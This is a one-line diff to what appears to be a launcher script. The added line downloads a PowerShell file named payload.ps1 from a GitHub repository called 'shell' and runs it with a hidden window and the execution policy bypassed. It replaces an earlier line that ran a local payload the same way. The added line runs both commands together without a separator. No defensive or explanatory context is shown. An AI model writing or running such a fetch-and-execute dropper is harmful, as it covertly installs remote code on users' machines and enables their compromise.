@@ -1,1 +1,1 @@
-PowerShell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ./payload.ps1
+curl https://raw.githubusercontent.com/Mood56467/shell/main/payload.ps1 -o payload2.ps1 PowerShell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ./payload2.ps1
